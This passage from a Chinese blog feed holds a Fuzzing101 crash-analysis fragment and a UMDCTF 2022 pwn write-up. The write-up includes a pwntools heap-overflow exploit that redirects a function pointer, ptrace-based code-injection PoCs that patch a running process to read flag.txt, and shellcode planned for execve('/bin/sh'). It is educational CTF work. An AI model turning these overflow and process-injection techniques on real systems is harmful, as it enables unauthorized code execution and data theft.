class="keyword">in</span> XRef::fetch (this=&lt;optimized out&gt;, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffff7ffdc8</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="调试源码"><a href="#调试源码" class="headerlink" title="调试源码"></a>调试源码</h2><p>找到了问题所在，可以回头看一下源码。发现确实存在递归调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// XRef.cc</span></span><br><span class="line">Object *<span class="title function_">XRef::fetch</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> gen, Object *obj)</span> &#123;</span><br><span class="line">  XRefEntry *e;</span><br><span class="line">  Parser *parser;</span><br><span class="line">  Object obj1, obj2, obj3;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// check for bogus ref - this can happen in corrupted PDF files</span></span><br><span class="line">  <span class="keyword">if</span> (num &lt; <span class="number">0</span> || num &gt;= size) &#123;</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  e = &amp;entries[num];</span><br><span class="line">  <span class="keyword">switch</span> (e-&gt;type) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> xrefEntryUncompressed:</span><br><span class="line">    <span class="keyword">if</span> (e-&gt;gen != gen) &#123;</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    obj1.initNull();</span><br><span class="line">    parser = new Parser(this,</span><br><span class="line">       new Lexer(this,</span><br><span class="line"> str-&gt;makeSubStream(start + e-&gt;offset, gFalse, <span class="number">0</span>, &amp;obj1)),</span><br><span class="line">       gTrue);</span><br><span class="line">    parser-&gt;getObj(&amp;obj1);</span><br><span class="line">    parser-&gt;getObj(&amp;obj2);</span><br><span class="line">    parser-&gt;getObj(&amp;obj3);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Object.cc</span></span><br><span class="line">Object *<span class="title function_">Object::fetch</span><span class="params">(XRef *xref, Object *obj)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (type == objRef &amp;&amp; xref) ?</span><br><span class="line">         xref-&gt;fetch(ref.num, ref.gen, obj) : copy(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到上面这两个方法循环的调用了自己。到此完成了这次lab的学习。</p>]]></content>
      
      
      <categories>
          
          <category> projects </category>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> fuzzing101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>umdctf2022-pwn</title>
      <link href="/2022/03/07/umdctf2022-pwn/"/>
      <url>/2022/03/07/umdctf2022-pwn/</url>
      
        <content type="html"><![CDATA[<p>umdctf2022-pwn 4 fun!</p><span id="more"></span><h1 id="the-show"><a href="#the-show" class="headerlink" title="the show"></a>the show</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>这个题也是有点恶心。一开始没发现还有个后门函数win，要不是在字符串里面看了一眼还找不到。</p><p><img src="/2022/03/07/umdctf2022-pwn/image-20220307140622856.png" alt="image-20220307140622856"></p><p>在setup后面的程序主要工作也没看明白，其中包含了太多的加密函数，也不知道代码里面的code是干什么用的。倒是setup中存在比较明显的溢出漏洞和函数指针。(需要手动修一下里面挺多的函数)</p><p><img src="/2022/03/07/umdctf2022-pwn/image-20220307140818676.png" alt="image-20220307140818676"></p><p>其实要是仔细分析一下发现漏洞也不难，主要是函数指针。观察到我们在mainAct里面储存了函数指针，大小为0x68，但是mainAct是在message1,2,3之后分配的，说明mainAct在message3后面。在后面我们又free掉了message3。但是在结束存在一个堆溢出，并且我们可以控制大小。<strong>我们只要将大小控制到message3，并且溢出修改mainAct的指针为win即可</strong>。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./theshow&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">30138</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b *0x4012E6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;What is the name of your act?&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;How long do you want the show description to be?&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Describe the show for us:&#x27;</span>)</span><br><span class="line"><span class="comment"># debug() // 找到偏移为0xf0</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x0000f0</span>+p64(elf.sym[<span class="string">&#x27;win&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Action:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># 调用win函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2022/03/07/umdctf2022-pwn/image-20220307140538701.png" alt="image-20220307140538701"></p><h1 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h1><p>这道题不会做，看了<a href="https://github.com/datajerk/ctf-write-ups/tree/master/umdctf2022/trace_story">wp</a>，了解到是关于ptrace的shellcode</p><p>看一下保护开启情况。</p><p><img src="/2022/03/07/umdctf2022-pwn/image-20220307142650657.png" alt="image-20220307142650657"></p><p>看到程序开启沙箱，但是没有发现orw？但是我们有gettimeofday和ptrace</p><p><img src="/2022/03/07/umdctf2022-pwn/image-20220307142049366.png" alt="image-20220307142049366"></p><p>程序也很简单，就是读入shellcode之后执行。主要考察的就是只能利用ptrace时的shellcode。以前还从未碰到过，这次就当学习了。</p><h2 id="ptrace是什么"><a href="#ptrace是什么" class="headerlink" title="ptrace是什么?"></a>ptrace是什么?</h2><p>参考<a href="https://www.linuxjournal.com/article/6210">链接</a>。之前看《linux二进制分析》这本书的时候也有学到过，这次复习一下几个要点。</p><p>主要参考以下代码，作用是可以设置断点。简要说明原理，是先通过attach上去，获取eip的值，先将其保存下来(20行)，再写入自己的code(22行)，之后继续运行(25行)。此时eip就会执行int80陷入内核，再int3陷入调试器。最后把原先的eip数值放回去，回复程序原先执行流程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;   <span class="type">pid_t</span> traced_process;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>, <span class="title">newregs</span>;</span></span><br><span class="line">    <span class="type">long</span> ins;</span><br><span class="line">    <span class="comment">/* int 0x80, int3 */</span></span><br><span class="line">    <span class="type">char</span> code[] = &#123;<span class="number">0xcd</span>,<span class="number">0x80</span>,<span class="number">0xcc</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> backup[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;pid to be traced&gt;\n&quot;</span>,</span><br><span class="line">               argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    traced_process = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="comment">/* Copy instructions into a backup variable */</span></span><br><span class="line">    getdata(traced_process, regs.eip, backup, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">/* Put the breakpoint */</span></span><br><span class="line">    putdata(traced_process, regs.eip, code, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">/* Let the process continue and execute</span></span><br><span class="line"><span class="comment">       the int 3 instruction */</span></span><br><span class="line">    ptrace(PTRACE_CONT, traced_process, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The process stopped, putting back &quot;</span></span><br><span class="line">           <span class="string">&quot;the original instructions\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Press &lt;enter&gt; to continue\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    putdata(traced_process, regs.eip, backup, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">/* Setting the eip back to the original</span></span><br><span class="line"><span class="comment">       instruction to let the process continue */</span></span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用图片表示流程，如下所示。</p><p><img src="/2022/03/07/umdctf2022-pwn/image-20220307152016719.png" alt="image-20220307152016719"></p><p>按照以上方法，我们成功向<strong>用户代码段插入了一行指令：陷入调试器。那么我们是不是还可以做得更多，例如插入任意代码呢？答案是可以的</strong>。只需要用完全一致的方法，通过内联汇编写好shellcode，编译获得字节码，用完全一致的方法插入到eip中即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;   <span class="type">pid_t</span> traced_process;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>, <span class="title">newregs</span>;</span></span><br><span class="line">    <span class="type">long</span> ins;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">41</span>;</span><br><span class="line">    <span class="comment">// 这一段insertcode是调用输出hello world的内联汇编通过x/20bx main看出的</span></span><br><span class="line">    <span class="type">char</span> insertcode[] =</span><br><span class="line"><span class="string">&quot;\xeb\x15\x5e\xb8\x04\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\xbb\x02\x00\x00\x00\x89\xf1\xba&quot;</span></span><br><span class="line">        <span class="string">&quot;\x0c\x00\x00\x00\xcd\x80\xcc\xe8\xe6\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f&quot;</span></span><br><span class="line">        <span class="string">&quot;\x72\x6c\x64\x0a\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> backup[len];</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;pid to be traced&gt;\n&quot;</span>,</span><br><span class="line">               argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    traced_process = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    getdata(traced_process, regs.eip, backup, len);</span><br><span class="line">    putdata(traced_process, regs.eip,</span><br><span class="line">            insertcode, len);</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    ptrace(PTRACE_CONT, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The process stopped, Putting back &quot;</span></span><br><span class="line">           <span class="string">&quot;the original instructions\n&quot;</span>);</span><br><span class="line">    putdata(traced_process, regs.eip, backup, len);</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Letting it continue with &quot;</span></span><br><span class="line">           <span class="string">&quot;original flow\n&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ptrace利用1——poc-orw"><a href="#ptrace利用1——poc-orw" class="headerlink" title="ptrace利用1——poc(orw)"></a>ptrace利用1——poc(orw)</h2><p>从上面我们可以想到一种思路: 利用ptrace尝试patch子进程执行流，修改read函数中目标文件为flag.txt，之后使用程序自带的puts输出即可。</p><p><img src="/2022/03/07/umdctf2022-pwn/image-20220307160458834.png" alt="image-20220307160458834"></p><p>这里是原先的汇编代码。可以看到puts这里只能输出”Didn’t read anything.”我们尝试把他patch掉。由于read之后的buffer在rsi中。我们想办法通过<code>mov rdi,rsi</code>之后调用puts就能输出buf内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004017E6 loc_4017E6:                             ; CODE XREF: read_story+64↑j</span><br><span class="line">.text:00000000004017E6                 lea     rcx, [rbp+buf]</span><br><span class="line">.text:00000000004017ED                 mov     eax, [rbp+fd]</span><br><span class="line">.text:00000000004017F3                 mov     edx, 1000h      ; nbytes</span><br><span class="line">.text:00000000004017F8                 mov     rsi, rcx        ; buf</span><br><span class="line">.text:00000000004017FB                 mov     edi, eax        ; fd</span><br><span class="line">.text:00000000004017FD                 call    _read</span><br><span class="line">.text:0000000000401802                 mov     [rbp+var_1018], rax</span><br><span class="line">.text:0000000000401809                 cmp     [rbp+var_1018], 0</span><br><span class="line">.text:0000000000401811                 jnz     short loc_401831</span><br><span class="line">.text:0000000000401813                 mov     eax, cs:debug</span><br><span class="line">.text:0000000000401819                 test    eax, eax</span><br><span class="line">.text:000000000040181B                 jz      short loc_401827</span><br><span class="line">.text:000000000040181D                 mov     edi, offset aDidnTReadAnyth ; &quot;Didn&#x27;t read anything.&quot;</span><br><span class="line">.text:0000000000401822                 call    _puts</span><br></pre></td></tr></table></figure><p>修改成如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4017fd:   e8 de f9 ff ff          call   4011e0 &lt;read@plt&gt;</span><br><span class="line">                                  nop</span><br><span class="line">                                  nop</span><br><span class="line">                                  ...</span><br><span class="line">                                  mov    rdi, rsi</span><br><span class="line">401822:   e8 49 f9 ff ff          call   401170 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure><p>尝试编写一个poc验证一下。(我没有自己写，直接复制的网上的，大致明白了流程)。可以看到大致是ptrace上一个进程，修改txt所在地址为flag.txt。</p><p><img src="/2022/03/07/umdctf2022-pwn/image-20220307220550881.png" alt="image-20220307220550881"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ins;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr = <span class="number">0x401802</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr_exit = <span class="number">0x401827</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> txt = <span class="number">0x402011</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: %s [pid]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//wait(NULL);</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rip: %llx\n&quot;</span>,regs.rip);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//puts after read patch</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr,    <span class="number">0x9090909090909090</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">8</span>,  <span class="number">0x9090909090909090</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">16</span>, <span class="number">0x9090909090909090</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">24</span>, <span class="number">0xf789489090909090</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//patchout exit</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr_exit+<span class="number">0</span>, <span class="number">0x9090909090909090</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr_exit+<span class="number">2</span>, <span class="number">0x9090909090909090</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//readstory.txt is now flag</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, txt, <span class="number">0x67616c66</span>);</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的addr+24位置的内容为我们自己添加的<code>mov rdi,rsi</code>可以用以下代码输出其对应的汇编代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = asm(<span class="string">&quot;mov rdi,rsi&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="comment"># 下面为输出</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">➜  trace_story python3 testasm.py</span></span><br><span class="line"><span class="string">b&#x27;H\x89\xf7&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>可以看到确实拿到了flag。</p><p><img src="/2022/03/07/umdctf2022-pwn/image-20220307222728045.png" alt="image-20220307222728045"></p><h2 id="ptrace利用2——poc-system"><a href="#ptrace利用2——poc-system" class="headerlink" title="ptrace利用2——poc(system)"></a>ptrace利用2——poc(system)</h2><p>有了上面的基础，我们可以大胆想象：既然都能随便修改指令了，我们直接系统调用execve(/bin/sh)不就行了吗？事实证明这样也是可以的。看到程序的如下部分: 注意0x4017aa位置将一个字符串变量放进rdi中，可以利用这个，将对应字符串修改为/bin/sh之后触发系统调用。下面我们试试写poc。</p><p>我们需要从0x40179f开始写。以下为原始内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040179D                 test    eax, eax</span><br><span class="line">.text:000000000040179F                 jnz     loc_40183E</span><br><span class="line">.text:00000000004017A5                 mov     esi, 0          ; oflag</span><br><span class="line">.text:00000000004017AA                 mov     edi, offset file ; &quot;readstory.txt&quot;</span><br><span class="line">.text:00000000004017AF                 mov     eax, 0</span><br><span class="line">.text:00000000004017B4                 call    _open</span><br><span class="line">;.text:00000000004017B9                 mov     [rbp+fd], eax</span><br></pre></td></tr></table></figure><p>我们打算修改成如下内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040179D                 nop</span><br><span class="line">.text:000000000040179e                 mov     rdx, 0</span><br><span class="line">.text:00000000004017A5                 mov     esi, 0          ; oflag</span><br><span class="line">.text:00000000004017AA                 mov     edi, offset file ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004017AF                 mov     eax, 0x3b ;execve的系统调用号</span><br><span class="line">.text:00000000004017B4                 syscall</span><br><span class="line">.text:00000000004017B6                 jmp $; 否则子进程就退出了</span><br><span class="line">.text:00000000004017B8                 nop</span><br><span class="line">;.text:00000000004017B9                 mov     [rbp+fd], eax&#x27;</span><br></pre></td></tr></table></figure><p>其中，字节码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># nop</span><br><span class="line">&#x27;\x90&#x27;</span><br><span class="line"># mov rdx,0</span><br><span class="line">&#x27;\x48\xc7\xc2\x00\x00\x00\x00&#x27;</span><br><span class="line"># mov esi,0</span><br><span class="line">\xbe\x00\x00\x00\x00</span><br><span class="line"># mov edi,binsh</span><br><span class="line">\xbf\x11\x20\x40\x00</span><br><span class="line"># mov eax,0x3b</span><br><span class="line">’\xb8\x3b\x00\x00\x00&#x27;</span><br><span class="line"># syscall</span><br><span class="line">&#x27;\x0f\x05&#x27;</span><br><span class="line"># jmp $</span><br><span class="line">\xeb\xfe</span><br><span class="line"># nop</span><br><span class="line">\x90\x90\x90</span><br></pre></td></tr></table></figure><p>后来我才想到，它开沙箱了。。顿时心里暖暖的。。。写了一个poc如下，能出hint说明写的应该是没毛病，就是因为开了沙箱，没法syscall。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 